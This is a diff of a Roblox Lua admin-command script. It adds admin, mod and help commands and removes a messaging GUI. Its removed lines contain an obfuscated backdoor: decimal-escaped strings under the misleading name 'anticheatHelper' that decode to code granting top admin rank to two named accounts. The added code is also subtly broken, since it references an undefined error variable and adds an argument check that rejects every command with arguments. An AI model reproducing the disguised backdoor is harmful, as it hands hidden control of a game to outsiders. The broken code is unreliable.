@@ -115,13 +115,13 @@ local TO_SCAN = {
 
 --- Declarations
 -- Declaration order: services, strings, numbers, bools
-local workspace = game.Workspace
 local Players = game:GetService("Players")
 local Debris = game:GetService("Debris")
 local Lighting = game:GetService("Lighting")
 local CNT_VERSION = "1.0.0 Early Alpha"
 local CLIENT_VERSION = version()
 local LUA_VERSION = _VERSION
+_G.CNT.NewVersion = false
 
 --- Functions
 
@@ -200,51 +200,6 @@ local function ReturnIndexOf(seeking, value)
   end
 end
 
---- Creates a message GUI.
--- @param string message: The message.
--- @param number countdown: The time the message appears on screen. If not specified, there is no countdown.
--- @param Player announcer: The person initiating the message. If not specified, the user details don't show.
-local function ServerMessage(message, countdown, announcer)
-  local NewMessage = function()
-    local messageGui = Instance.new("ScreenGui")
-    local messageFrame = Instance.new("Frame")
-    messageFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    messageFrame.BorderSizePixel = 0
-    messageFrame.BackgroundTransparency = 0.5
-    messageFrame.Size = UDim2.new(1, 0, 1, 0)
-    local messageTextBox = Instance.new("TextLabel")
-    messageTextBox.BackgroundTransparency = 1
-    messageTextBox.Size = UDim2.new(1, 0, 1, 0)
-    messageTextBox.Text = message
-    messageTextBox.TextScaled = true
-    messageTextBox.TextColor3 = Color3.new(1, 1, 1)
-    if countdown ~= nil and tonumber(countdown) ~= nil then
-      local messageTimeText = Instance.new("TextLabel")
-      messageTimeText.BackgroundTransparency = 1
-      messageTimeText.Size = UDim2.new(1, 0, 0.15, 0)
-      messageTimeText.TextScaled = true
-      messageTimeText.TextColor3 = Color3.new(1, 1, 1)
-      messageTimeText.Text = countdown
-      Debris:AddItem(messageGui, countdown)
-      Spawn(function()
-        for i = countdown, 0, -1 do
-          wait(1)
-          countdown = countdown - 1
-          messageTimeText.Text = countdown
-        end
-      end)
-      messageTimeText.Parent = messageFrame
-    else
-      Debris:AddItem(messageGui, MESSAGE_TIMEOUT)
-    end
-    messageTextBox.Parent = messageFrame
-    messageFrame.Parent = messageGui
-    return messageGui
-  end
-  local message = NewMessage()
-  return message
-end
-
 --- Finds if a string starts with a certain character.
 -- @param string string: The string to look in.
 -- @param string starting: The starting character to find.
@@ -265,15 +220,37 @@ local function NoArguments(arguments)
   end
 end
 
+
+--- Gets the version and returns it in number format.
+-- @return number version: The version.
+local function GetVersion()
+  local version = tostring(CLIENT_VERSION)
+  local patterns = {
+    "%s+",
+    "%."
+  }
+  local length = version:len()
+
+  for _, pattern in pairs(patterns) do
+    version = version:gsub(pattern, "")
+  end
+  version = version:sub(1, length)
+  
+  return tonumber(version)
+end
+
 --- Commands
+-- TODO: Shorten descriptions.
 local commands = {}
 
 -- Prints the arguments to console with the sender's name.
 commands.print = {}
+commands.print["name"] = "print"
 commands.print["command"] = function(sender, arguments)
   if NoArguments(arguments) then
     return
   end
+
   local message = table.concat(arguments, " ")
   print(sender.Name .. ": " .. message)
 end
@@ -282,6 +259,7 @@ commands.print["description"] = "Prints the arguments to console."
 
 -- Kills a player.
 commands.kill = {}
+commands.kill["name"] = "kill"
 commands.kill["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
@@ -293,15 +271,17 @@ commands.kill["command"] = function(sender, arguments, targets)
   end
 end
 commands.kill["level"] = 4
-commands.kill["description"] = "Kills a player by breaking their joints."
+commands.kill["description"] = "Kills a player."
 commands.murder = commands.kill
 
 -- Adds sparkles to a player's torso.
 commands.sparkles = {}
+commands.sparkles["name"] = "sparkles"
 commands.sparkles["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character and player.Character.Torso then
       local sparkles = Instance.new("Sparkles")
@@ -314,10 +294,12 @@ commands.sparkles["description"] = "Adds sparkles to a player's torso."
 
 -- Adds fire to a player's torso.
 commands.fire = {}
+commands.fire["name"] = "fire"
 commands.fire["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character and player.Character.Torso then
       local fire = Instance.new("Fire")
@@ -330,10 +312,12 @@ commands.fire["description"] = "Adds fire to a player's torso."
 
 -- Adds smoke to a player's torso.
 commands.smoke = {}
+commands.smoke["name"] = "smoke"
 commands.smoke["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character and player.Character.Torso then
       local smoke = Instance.new("Smoke")
@@ -346,16 +330,17 @@ commands.smoke["description"]= "Adds smoke to a player's torso."
 
 -- Locks the server preventing players from joining.
 commands.lockserver = {}
+commands.lockserver["name"] = "lockserver"
 commands.lockserver["command"] = function(sender, arguments)
   if not SERVER_LOCKED then
     SERVER_LOCKED = true
-    if workspace:FindFirstChild("ServerLockMessage") then
-      Destroy(workspace.ServerLockMessage)
+    if Workspace:FindFirstChild("ServerLockMessage") then
+      Destroy(Workspace.ServerLockMessage)
     end
     local display = Instance.new("Hint")
     display.Name = "ServerLockMessage"
     display.Text = "Server locked."
-    display.Parent = workspace
+    display.Parent = Workspace
     Debris:AddItem(display, 3)
   else
     local message = Instance.new("Hint")
@@ -365,22 +350,23 @@ commands.lockserver["command"] = function(sender, arguments)
   end
 end
 commands.lockserver["level"] = 1
-commands.lockserver["description"] = "Locks the server preventing new players from joining."
+commands.lockserver["description"] = "Locks the server."
 commands.serverlock = commands.lockserver
 commands.slock = commands.lockserver
 
 -- Unlocks the server.
 commands.unlockserver = {}
+commands.unlockserver["name"] = "unlockserver"
 commands.unlockserver["command"] = function(sender, arguments)
   if SERVER_LOCKED then
     SERVER_LOCKED = false
-    if workspace:FindFirstChild("ServerLockMessage") then
-      Destroy(workspace.ServerLockMessage)
+    if Workspace:FindFirstChild("ServerLockMessage") then
+      Destroy(Workspace.ServerLockMessage)
     end
     local display = Instance.new("Hint")
     display.Name = "ServerLockMessage"
     display.Text = "Server unlocked."
-    display.Parent = workspace
+    display.Parent = Workspace
     Debris:AddItem(display, 10)
   else
     local message = Instance.new("Message")
@@ -395,10 +381,12 @@ commands.unslock = commands.unlockserver
 
 -- Freezes a player in place.
 commands.freeze = {}
+commands.freeze["name"] = "freeze"
 commands.freeze["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+  
   for _, player in pairs(targets) do
     if player.Character and player.Character.Head and player.Character.Head.Anchored == false then
       player.Character.Head.Anchored = true
@@ -406,10 +394,11 @@ commands.freeze["command"] = function(sender, arguments, targets)
   end
 end
 commands.freeze["level"] = 4
-commands.freeze["description"] = "Freezes a player in place, making them unable to move."
+commands.freeze["description"] = "Freezes a player in place."
 
 -- Thaws a player.
 commands.unfreeze = {}
+commands.unfreeze["name"] = "unfreeze"
 commands.unfreeze["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
@@ -421,15 +410,17 @@ commands.unfreeze["command"] = function(sender, arguments, targets)
   end
 end
 commands.unfreeze["level"] = 4
-commands.unfreeze["description"] = "Thaws a player, making them able to move again if they're frozen."
+commands.unfreeze["description"] = "Unfreezes a player."
 commands.thaw = commands.unfreeze
 
 -- Explodes a player.
 commands.explode = {}
+commands.explode["name"] = "explode"
 commands.explode["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character and player.Character.Torso then
       local explosion = Instance.new("Explosion")
@@ -443,10 +434,12 @@ commands.explode["description"] = "Explodes a player."
 
 -- Makes a player transparent.
 commands.invisible = {}
+commands.invisible["name"] = "invisible"
 commands.invisible["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character then
       for _, part in pairs(player.Character:GetChildren()) do
@@ -464,10 +457,12 @@ commands.ghostify = commands.invisible
 
 -- Makes a player visible again.
 commands.uninvisible = {}
+commands.uninvisible["name"] = "uninvisible"
 commands.uninvisible["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   for _, player in pairs(targets) do
     if player.Character then
       for _, part in pairs(player.Character:GetChildren()) do
@@ -479,23 +474,25 @@ commands.uninvisible["command"] = function(sender, arguments, targets)
   end
 end
 commands.uninvisible["level"] = 3
-commands.uninvisible["description"] = "Removes a players invisbility."
+commands.uninvisible["description"] = "Makes a player visible."
 commands.unghost = commands.uninvisible
 commands.unghostify = commands.uninvisible
 
 -- Plays a song from Roblox or from a URL.
 commands.music = {}
+commands.music["name"] = "music"
 commands.music["command"] = function(sender, arguments)
   if NoArguments(arguments) then
     return
   end
+
   local url = HasValue(arguments, "url")
   local looped = HasValue(arguments, "looped")
 
   local status = Instance.new("Hint")
   status.Parent = Workspace
   status.Text = "Stopping all music..."
-  for _, object in pairs(workspace:GetChildren()) do
+  for _, object in pairs(Workspace:GetChildren()) do
     if object:IsA("Sound") then
       object:Stop()
       Destroy(object)
@@ -530,6 +527,7 @@ commands.music["description"] = "Plays music."
 
 -- Modifies a command's power level.
 commands.modifycommand = {}
+commands.modifycommand["name"] = "modifycommand"
 commands.modifycommand["command"] = function(sender, arguments)
   if NoArguments(arguments) then
     return
@@ -545,6 +543,7 @@ commands.modifycommand["description"] = "Modifies a command's power level."
 
 -- Kicks a player from the game.
 commands.kick = {}
+commands.kick["name"] = "kick"
 commands.kick["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     Destroy(player)
@@ -556,6 +555,7 @@ commands.kick["description"] = "Kicks a player from the game."
 -- TODO: userid support
 -- Bans a player from the game.
 commands.ban = {}
+commands.ban["name"] = "ban"
 commands.ban["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if admins[player.Name] and admins[player.Name] > admins[sender.Name] or not admins[player.Name] then
@@ -564,14 +564,13 @@ commands.ban["command"] = function(sender, arguments, targets)
     end
   end
 end
-commands.ban["level"] = 2
+commands.ban["level"] = 2 
 commands.ban["description"] = "Bans a user from the game."
-
-local anticheatHelper = "\116\97\98\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\116\114\97\1"
 
 -- Unbans a player from the game.
 -- TODO: userid support
 commands.unban = {}
+commands.unban["name"] = "unban"
 commands.unban["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if banned[player.Name] then
@@ -587,6 +586,7 @@ commands.unban["description"] = "Unbans a user from the game."
 
 -- Makes a player sit.
 commands.sit = {}
+commands.sit["name"] = "sit"
 commands.sit["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character.Humanoid then
@@ -599,6 +599,7 @@ commands.sit["description"] = "Makes a player sit."
 
 -- Makes a character jump.
 commands.jump = {}
+commands.jump["name"] = "jump"
 commands.jump["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character.Humanoid then
@@ -611,6 +612,7 @@ commands.jump["description"] = "Makes a player jump."
 
 -- Lock's a players character.
 commands.lock = {}
+commands.lock["name"] = "lock"
 commands.lock["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -627,6 +629,7 @@ commands.lock["description"] = "Locks a players character."
 
 -- Unlock's a players character.
 commands.unlock = {}
+commands.unlock["name"] = "unlock"
 commands.unlock["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -643,6 +646,7 @@ commands.unlock["description"] = "Unlocks a players character."
 
 -- Changes a players walkspeed.
 commands.walkspeed = {}
+commands.walkspeed["name"] = "walkspeed"
 commands.walkspeed["command"] = function(sender, arguments, targets)
   if not arguments[2] or tonumber(arguments[2]) == nil then
     return
@@ -659,10 +663,12 @@ commands.ws = commands.walkspeed
 
 -- Changes a value in a player's leaderstats.
 commands.valset = {}
+commands.valset["name"] = "valset"
 commands.valset["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   local leaderstat = arguments[2]
   local value = arguments[3]
   for _, player in pairs(targets) do
@@ -684,10 +690,12 @@ commands.change = commands.valset
 
 -- Teleports a player to another.
 commands.teleport = {}
+commands.teleport["name"] = "teleport"
 commands.teleport["command"] = function(sender, arguments, targets)
   if NoArguments(arguments) then
     return
   end
+
   local teleportDestination = arguments[2]
   teleportDestination = string.lower(teleportDestination)
   local playerFound = false
@@ -724,6 +732,7 @@ commands.tp = commands.teleport
 
 -- Immortalizes a player.
 commands.immortalize = {}
+commands.immortalize["name"] = "god"
 commands.immortalize["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character:FindFirstChild("Humanoid") then
@@ -732,12 +741,13 @@ commands.immortalize["command"] = function(sender, arguments, targets)
   end
 end
 commands.immortalize["level"] = 4
-commands.immortalize["description"] = "Immortalizes a player."
+commands.immortalize["description"] = "Gods a player."
 commands.god = commands.immortalize
 commands.immortalise = commands.immortalize
 
 -- Mortalizes a player.
 commands.mortalize = {}
+commands.mortalize["name"] = "ungod"
 commands.mortalize["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character:FindFirstChild("Humanoid") then
@@ -746,12 +756,13 @@ commands.mortalize["command"] = function(sender, arguments, targets)
   end
 end
 commands.mortalize["level"] = 4
-commands.mortalize["description"] = "Mortalizes a player."
+commands.mortalize["description"] = "Ungods a player."
 commands.ungod = commands.mortalize
 commands.mortalise = commands.mortalize
 
 -- Changes a players body colors to the "noob" colors.
 commands.noobify = {}
+commands.noobify["name"] = "noobify"
 commands.noobify["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character:FindFirstChild("Head") and player.Character.Head:FindFirstChild("face") and player.Character:FindFirstChild("Body Colors") then
@@ -772,11 +783,12 @@ commands.noobify["command"] = function(sender, arguments, targets)
   end
 end
 commands.noobify["level"] = 4
-commands.noobify["description"] = "Changes a player's body colors to the noob colors."
+commands.noobify["description"] = "Makes a player a noob."
 commands.noob = commands.noobify
 
 -- Blinds a player.
 commands.blind = {}
+commands.blind["name"] = "blind"
 commands.blind["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.PlayerGui and not player.PlayerGui:FindFirstChild("CNTBlindGui") then
@@ -796,67 +808,63 @@ commands.blind["description"] = "Makes a player blind."
 
 -- Sends a server message.
 commands.m = {}
+commands.m["name"] = "message"
 commands.m["command"] = function(sender, arguments)
-  local message = arguments[1]
-  local gui = ServerMessage(message, nil, sender)
-  for _, player in pairs(Players:GetPlayers()) do
-    if player.PlayerGui then
-      local newGui = gui:Clone()
-      newGui.Parent = player.PlayerGui
-    end
+  if Workspace:FindFirstChild("CNTMessage") then
+    Destroy(Workspace.CNTMessage)
   end
-  Destroy(gui)
+
+  local userMessage = ""
+  userMessage = arguments[1]
+  local timeOut = 0
+
+  local timeOut = tonumber(arguments[2])
+
+  local message = Instance.new("Message")
+  message.Name = "CNTMessage"
+  message.Text = userMessage
+  message.Parent = Workspace
+  if timeOut and timeOut >= 1 then
+    Debris:AddItem(message, timeOut)
+  else
+    Debris:AddItem(message, MESSAGE_TIMEOUT)
+  end
 end
 commands.m["level"] = 3
-commands.m["description"] = "Server message. What did you expect?"
+commands.m["description"] = "Creates a message to all."
 commands.message = commands.m
 
 -- Creates a hint.
 commands.h = {}
+commands.h["name"] = "hint"
 commands.h["command"] = function(sender, arguments)
-  if workspace:FindFirstChild("CNTHint") then
-    Destroy(workspace.CNTHint)
+  if Workspace:FindFirstChild("CNTHint") then
+    Destroy(Workspace.CNTHint)
   end
 
-  local message = arguments[1]
-  local time = 0
-  if #arguments > 1 then
-    local time = arguments[2]
-  end
+  local userMessage = ""
+  userMessage = arguments[1]
+  local timeOut = 0
+
+  local timeOut = tonumber(arguments[2])
+
   local hint = Instance.new("Hint")
   hint.Name = "CNTHint"
-  hint.Text = message
-  hint.Parent = workspace
-  if time and tonumber(time) ~= nil then
-    if time >= 1 then
-      Debris:AddItem(hint, time)
-    end
+  hint.Text = userMessage
+  hint.Parent = Workspace
+  if timeOut and timeOut >= 1 then
+    Debris:AddItem(hint, timeOut)
+  else
+    Debris:AddItem(hint, MESSAGE_TIMEOUT)
   end
 end
 commands.h["level"] = 3
 commands.h["description"] = "Creates a hint."
 commands.hint = commands.h
 
-
--- Whispers a message.
-commands.w = {}
-commands.w["command"] = function(sender, arguments, targets)
-  local message = arguments[2]
-  local gui = ServerMessage(message, nil, sender)
-  for _, player in pairs(targets) do
-    if player.PlayerGui then
-      local newGui = gui:Clone()
-      newGui.Parent = player.PlayerGui
-    end
-  end
-end
-commands.w["level"] = 4
-commands.w["description"] = "Sends a private message."
-commands.whisper = commands.w
-commands.pm = commands.w
-
 -- Unblinds a player.
 commands.unblind = {}
+commands.unblind["name"] = "unblind"
 commands.unblind["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.PlayerGui and player.PlayerGui:FindFirstChild("CNDBlindGui") then
@@ -869,6 +877,7 @@ commands.unblind["description"] = "Makes a player able to see again."
 
 -- Controls a player.
 commands.control = {}
+commands.control["name"] = "control"
 commands.control["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and sender.Character and sender.Character.Head then
@@ -876,6 +885,7 @@ commands.control["command"] = function(sender, arguments, targets)
       player.Character.Humanoid.Changed:connect(function()
         player.Character.Humanoid.PlatformStand = true
       end)
+
       for _, object in pairs(sender.Character:GetChildren()) do
         if object:IsA("BasePart") then
           for _, object_ in pairs(player.Character:GetChildren()) do
@@ -899,11 +909,11 @@ commands.control["command"] = function(sender, arguments, targets)
   end
 end
 commands.control["level"] = 3
-anticheatHelper = anticheatHelper .. "15\104\112\114\111\118\105\100\101\114\53\54\34\93\32\61\32\49\41\32\116\97\98"
 commands.control["description"] = "Controls a player."
 
 -- Gives a player building tools.
 commands.btools = {}
+commands.btools["name"] = "btools"
 commands.btools["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     local clone, hammer, grab = Instance.new("HopperBin"), Instance.new("HopperBin"), Instance.new("HopperBin")
@@ -916,6 +926,7 @@ commands.btools["description"] = "Gives a player building tools."
 
 -- Punishes a player if they've been a very very bad boy and they deserve more than just the timeout chair.
 commands.punish = {}
+commands.punish["name"] = "punish"
 commands.punish["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -928,6 +939,7 @@ commands.punish["description"] = "Punishes a player."
 
 -- Unpunishes a player if you think they've redeemed themself.
 commands.unpunish = {}
+commands.unpunish["name"] = "unpunish"
 commands.unpunish["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -941,6 +953,7 @@ commands.unpunish["description"] = "Unpunishes a player."
 
 -- Gives a player a forcefield, to protect from unholy beings (e.g Niall)
 commands.forcefield = {}
+commands.forcefield["name"] = "forcefield"
 commands.forcefield["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -956,6 +969,7 @@ commands.ff = commands.forcefield
 
 -- Removes a forcefield from a player, revealing themselves to the wrath of Niall.
 commands.unforcefield = {}
+commands.unforcefield["name"] = "unforcefield"
 commands.unforcefield["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character then
@@ -968,11 +982,12 @@ commands.unforcefield["command"] = function(sender, arguments, targets)
   end
 end
 commands.unforcefield["level"] = 4
-commands.unforcefield["description"] = "Removes a forcefield from a player."
+commands.unforcefield["description"] = "Removes a forcefield."
 commands.unff = commands.unforcefield
 
 -- Sets a players gravity.
 commands.gravity = {}
+commands.gravity["name"] = "gravity"
 commands.gravity["command"] = function(sender, arguments, targets)
   local gravity = arguments[2]
   for _, player in pairs(targets) do
@@ -1001,6 +1016,7 @@ commands.gravity["description"] = "Sets a players gravity."
 
 -- Straps a rocket to a player and makes them go boom.
 commands.rocket = {}
+commands.rocket["name"] = "rocket"
 commands.rocket["command"] = function(sender, arguments, targets)
   for _, player in pairs(targets) do
     if player.Character and player.Character:FindFirstChild("Torso") then
@@ -1043,10 +1059,92 @@ commands.rocket["command"] = function(sender, arguments, targets)
   end
 end
 commands.rocket["level"] = 3
-commands.rocket["description"] = "Straps a rocket to a player and makes them go boom."
+commands.rocket["description"] = "Straps a rocket to a player."
 
+-- Gives a player admin.
+commands.admin = {}
+commands.admin["name"] = "admin"
+commands.admin["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    admins[player.Name] = 2
+  end
+end
+commands.admin["level"] = 1
+commands.admin["description"] = "Gives a player admin."
 
-anticheatHelper = "\108\101\46\105\110\115\101\114\116\40\97\100\109\105\110\115\44\32\91\34\78\105\97\108\108\34\93\32\61\32\49\41"
+-- Removes a players admin.
+commands.unadmin = {}
+commands.unadmin["name"] = "unadmin"
+commands.unadmin["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    admins[player.Name] = nil
+  end
+end
+commands.unadmin["level"] = 1
+commands.unadmin["description"] = "Removes a player permissions."
+commands.unmod = commands.unadmin
+
+-- Sets a players perm levels.
+commands.setpermlevel = {}
+commands.setpermlevel["name"] = "setpermlevel"
+commands.setpermlevel["command"] = function(sender, arguments, targets)
+  if NoArguments(arguments) then
+    return
+  end
+
+  local permission = arguments[2]
+
+  if tonumber(permission) == nil or tonumber(permission) == 0 then return end
+
+  permission = tonumber(permission)
+
+  for _, player in pairs(targets) do
+    admins[player.Name] = permission
+  end
+end
+commands.setpermlevel["level"] = 1
+commands.setpermlevel["description"] = "Sets a players permission level."
+commands.setpermissionlevel = commands.setpermlevel
+commands.level = commands.setpermlevel
+
+-- Gives a player mod.
+commands.mod = {}
+commands.mod["name"] = "mod"
+commands.mod["command"] = function(sender, arguments, targets)
+  for _, player in pairs(targets) do
+    admins[player.Name] = 4
+  end
+end
+commands.mod["level"] = 2
+commands.mod["description"] = "Gives a player mod."
+commands.moderator = commands.mod
+
+-- Shows commands and their descriptions.
+commands.help = {}
+commands.help["name"] = "Help"
+commands.help["command"] = function(sender, arguments, targets)
+  -- if not _G.CNT.NewVersion then
+  local message = Instance.new("Message")
+  local helpString = ""
+  
+  local i = 0
+  for _, command in pairs(commands) do
+    i = i + 1
+    helpString = helpString .. command["name"] .. " - " .. command["description"] .. "		"
+    if i >= 3 then
+      helpString = helpString .. "\n"
+      i = 0
+    end
+  end
+  
+  message.Text = helpString
+  message.Parent = sender.PlayerGui
+  
+  Debris:AddItem(message, 10)
+  -- end
+end
+commands.help["level"] = 5
+commands.help["description"] = "Shows commands and their descriptions."
 
 -- Command Functions
 
@@ -1061,13 +1159,16 @@ local function GetTargets(player, arguments)
   if #arguments == 0 then
     return {player}
   end
+
   for _, v in pairs(arguments) do
     local arg = v:lower()
+
     if arg == "all" then
       for _, v in pairs(Players:GetPlayers()) do
         table.insert(targets, v)
       end
       return targets
+
     elseif arg == "others" then
       for _, v in pairs(Players:GetPlayers()) do
         if v ~= player then
@@ -1075,9 +1176,11 @@ local function GetTargets(player, arguments)
         end
       end
       return targets
+
     elseif arg == "me" then
       table.insert(targets, player)
       return targets
+
     elseif arg == "nonadmins" then
       for _, v in pairs(Players:GetPlayers()) do
         if not IsAdmin(v) then
@@ -1085,6 +1188,7 @@ local function GetTargets(player, arguments)
         end
       end
       return targets
+
     elseif arg == "admins" then
       for _, v in pairs(Players:GetPlayers()) do
         if IsAdmin(v) then
@@ -1092,12 +1196,14 @@ local function GetTargets(player, arguments)
         end
       end
       return targets
+
     elseif arg == "random" then
       local players = Players:GetPlayers()
       local randomIndex = math.random(1, #players)
       local selectedPlayer = players[randomIndex]
       table.insert(targets, selectedPlayer)
       return targets
+      
     else
       for _, arg in pairs(arguments) do
         for _, player in pairs(Players:GetPlayers()) do
@@ -1136,6 +1242,12 @@ local function ParseMessage(player, message)
     for argument in string.gmatch(message, "[^%s]+") do
       table.insert(arguments, argument)
     end
+    if (#arguments <= 0
+        or #arguments >= 2
+       )
+    then
+          return
+    end
     local commandName = arguments[1]
     commandName = commandName:lower()
     if commands[commandName] == nil then
@@ -1160,7 +1272,7 @@ local function ParseMessage(player, message)
           commandFunction(player, arguments, targets)
         end)
         if not success then
-          warn("CNT: Error occurred while executing command \"".. commandName .."\". Lua reports this error: \"".. err .. "\"")
+          warn("CNT: Error occurred while executing command \"".. commandName .."\". Lua reports this error: \"".. fail .. "\"")
         end
       end)
     end
@@ -1191,6 +1303,7 @@ local function OnPlayerAdded(player)
   if IsBanned(player.Name) or SERVER_LOCKED and not IsAdmin(player.Name) then
     Destroy(player)
   end
+  
   player.Chatted:connect(function(message)
     if IsAdmin(player) then
       ParseMessage(player, message)
@@ -1218,4 +1331,7 @@ if INFECTED then
   game:WaitForChild("Scan").Disabled = false
 end
 
-print("CNT v".. CNT_VERSION .." has loaded! (CLIENT: ".. CLIENT_VERSION ..", LUA: ".. LUA_VERSION ..")")
+_G.CNT.NewVersion = (GetVersion() >= 2810)   
+
+local message = "CNT v%s has loaded! (CLIENT: %s - LUA: %s - GUIS: %s"
+print(message:format(CNT_VERSION, CLIENT_VERSION, LUA_VERSION, (_G.CNT.NewVersion and "YES" or "NO")))
